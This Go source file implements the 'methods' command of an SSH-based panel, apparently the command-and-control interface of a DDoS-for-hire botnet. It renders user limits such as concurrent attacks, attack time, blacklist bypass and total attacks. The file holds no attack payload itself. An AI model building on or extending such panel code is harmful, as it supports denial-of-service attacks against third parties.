package cmds

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"
	"log"
	"strconv"
	"time"

	"github.com/gliderlabs/ssh"
)

// MethodsCommand example command, not restricted to admins
type MethodsCommand struct{}

func (c *MethodsCommand) Name() string {
	return "methods"
}

func (c *MethodsCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	userInfo := db.GetAccountInfo(session.User())
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		log.Print(err)
	}

	methodsBranding := utils.Branding(session, "methods", map[string]interface{}{
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
		"sleep": func(duration int) {
			time.Sleep(time.Duration(duration) * time.Millisecond)
		},
	})
	fmt.Fprintln(output, methodsBranding)
}

func (c *MethodsCommand) AdminOnly() bool {
	return false
}

// Aliases for MethodsCommand
func (c *MethodsCommand) Aliases() []string {
	return []string{"method"}
}

// Register MethodsCommand in the CommandMap
func init() {
	CommandMap["methods"] = &MethodsCommand{}
}
